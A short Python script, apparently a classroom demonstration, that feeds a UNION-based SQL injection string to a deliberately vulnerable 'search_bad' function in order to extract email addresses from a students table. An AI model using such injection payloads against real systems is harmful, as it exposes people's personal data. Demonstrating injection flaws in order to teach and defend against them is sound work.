from search_bad import search

q = "zzz' UNION SELECT email FROM students --"
for row in search(q):
    print(row.title)
